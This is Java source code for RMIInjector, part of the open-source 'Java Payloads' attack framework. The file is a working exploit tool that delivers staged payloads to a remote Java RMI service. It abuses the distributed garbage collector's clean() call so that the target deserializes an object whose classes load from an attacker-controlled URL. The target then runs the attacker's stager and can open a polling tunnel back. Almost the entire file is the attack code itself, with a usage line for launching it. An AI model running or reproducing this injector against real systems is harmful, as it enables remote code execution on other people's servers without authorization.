/*
 * Java Payloads.
 * 
 * Copyright (c) 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutput;
import java.lang.reflect.Field;
import java.net.URL;
import java.net.URLClassLoader;
import java.rmi.NoSuchObjectException;
import java.rmi.server.ObjID;
import java.rmi.server.Operation;
import java.rmi.server.RemoteCall;

import javapayload.Parameter;
import javapayload.handler.stager.PollingTunnel;
import javapayload.handler.stager.StagerHandler;
import javapayload.loader.DynLoader;
import javapayload.loader.rmi.Loader;
import javapayload.loader.rmi.PollingSenderImpl_Stub;
import javapayload.loader.rmi.TunnelInitializer;
import javapayload.stage.StreamForwarder;
import sun.rmi.server.UnicastRef2;
import sun.rmi.transport.DGCImpl_Stub;
import sun.rmi.transport.Endpoint;
import sun.rmi.transport.LiveRef;
import sun.rmi.transport.tcp.TCPEndpoint;

public class RMIInjector extends Injector {

	public static void main(String[] args) throws Exception {
		if (args.length == 2 && args[0].equals("-buildjar")) {
			RMIBuilder.buildJar(args[1]);
			return;
		} else if (args.length < 6) {
			System.out.println("Usage: java javapayload.builder.RMIInjector <url> <hostname> <port> <stager> [stageroptions] -- <stage> [stageoptions]");
			System.out.println("       java javapayload.builder.RMIInjector -buildjar <filename>.jar");
			return;
		}
		new RMIInjector().inject(args);
	}
	
	public RMIInjector() {
		super("Inject a payload via a RMI connection",
				"This injector is used to inject payloads via a RMI port (as used by the rmid\r\n" +
				"and rmiregistry utilities). For that it is important to have a few classes\r\n" +
				"(generated by the RMI builder) stored at a URL that can be accessed by\r\n" +
				"both the attacker and the victim.");
	}
	
	public Parameter[] getParameters() {
		return new Parameter[] {
			new Parameter("URL", false, Parameter.TYPE_URL, "URL to load the RMI classes from"),
			new Parameter("RHOST", false, Parameter.TYPE_HOST, "Host to connect to"),
			new Parameter("RPORT", false, Parameter.TYPE_PORT, "Port to connect to"),
		};
	}
	
	public void inject(String[] parameters, javapayload.handler.stager.StagerHandler.Loader loader, String[] stagerArgs) throws Exception {
		inject(parameters[0], parameters[1], Integer.parseInt(parameters[2]), loader, stagerArgs);	
	}

	public static void inject(String url, String host, int port, final StagerHandler.Loader loader, String[] stagerArgs) throws Exception {
		final String stager = stagerArgs[0];
		boolean isPollingTunnelStager = loader.canHandleExtraArg(PollingTunnel.CommunicationInterface.class);
		loader.handleBefore(loader.stageHandler.consoleErr, null); // may modify stagerArgs

		ObjID objid = null;		
		Object[] parameters = new Object[] {stagerArgs};
		Class[] classes = new Class[] { 
				javapayload.stager.Stager.class,
				DynLoader.loadStager(stager, stagerArgs, 0),
				javapayload.loader.rmi.StagerThread.class,
				javapayload.loader.rmi.StagerInitializer.class,
		};
		if (isPollingTunnelStager) {
			objid = new ObjID();
			final ByteArrayOutputStream out = new ByteArrayOutputStream();
			StreamForwarder.forward(TunnelInitializer.class.getResourceAsStream("/" + TunnelInitializer.class.getName().replace('.', '/') + ".class"), out);
			parameters = new Object[] {stagerArgs, out.toByteArray(), objid};
			classes = new Class[] {
					javapayload.stager.Stager.class,
					classes[1], 
					javapayload.loader.rmi.StagerThread.class,
					javapayload.loader.rmi.PollingSender.class,
					javapayload.loader.rmi.PollingSenderImpl.class,
					javapayload.loader.rmi.TunnelInitializerLoader.class,
					javapayload.loader.rmi.StagerInitializer.class,
			};			
		}
		final byte[][] classBytes = new byte[classes.length][];
		for (int i = 0; i < classes.length; i++) {
			final ByteArrayOutputStream out = new ByteArrayOutputStream();
			StreamForwarder.forward(classes[i].getResourceAsStream("/" + classes[i].getName().replace('.', '/') + ".class"), out);
			classBytes[i] = out.toByteArray();
		}

		Endpoint endpoint = new TCPEndpoint(host, port);
		URLClassLoader ucl = new URLClassLoader(new URL[] {new URL(url)});
		Loader loaderImpl = (Loader)ucl.loadClass("javapayload.loader.rmi.LoaderImpl").newInstance();
		loaderImpl.classes = classBytes;
		loaderImpl.parameters = parameters;

		callClean(endpoint, loaderImpl);
		
		if (isPollingTunnelStager) {
			final PollingSenderImpl_Stub senderStub = new PollingSenderImpl_Stub(new UnicastRef2(new LiveRef(objid, endpoint, false)));
			loader.handleAfter(loader.stageHandler.consoleErr, new PollingTunnel.CommunicationInterface() {
				public String sendData(String request) throws Exception {
					try {
					return senderStub.sendData(request);
					} catch (NoSuchObjectException ex) {
						Thread.sleep(2000);
						return senderStub.sendData(request);
					}
				}
			});
		} else {
			loader.handleAfter(loader.stageHandler.consoleErr, null);
		}
	}
	
	public Class[] getSupportedExtraArgClasses() {
		return new Class[] { PollingTunnel.CommunicationInterface.class, null };
	}
	
	/**
	 * Invoke the clean() method on the DGC service on the given
	 * {@link Endpoint}. The call is
	 * <code>service.clean(new ObjID[0], 0, object, false);</code>, so that the
	 * <code>object</code> parameter gets deserialized in the target process,
	 * but is ignored. To avoid {@link ClassCastException}s, the
	 * <code>object</code> should implement a <code>readResolve</code> method
	 * that returns null.
	 * 
	 * @param endpoint
	 *            Endpoint to call the service on
	 * @param object
	 *            serializable object to pass to the service
	 */
	private static void callClean(Endpoint endpoint, Object object) throws Exception {
		UnicastRef2 ref = new UnicastRef2(new LiveRef(new ObjID(ObjID.DGC_ID), endpoint, false));
		DGCImpl_Stub stub = new DGCImpl_Stub(ref);
		Field f = stub.getClass().getDeclaredField("operations");;
		f.setAccessible(true);
		RemoteCall remotecall = ref.newCall(stub, (Operation[])f.get(stub), 0, 0xf6b6898d8bf28643L);
		ObjectOutput objectoutput = remotecall.getOutputStream();
		objectoutput.writeObject(new ObjID[0]);
		objectoutput.writeLong(0);
		objectoutput.writeObject(object);
		objectoutput.writeBoolean(false);
		ref.invoke(remotecall);
		ref.done(remotecall);		
	}
}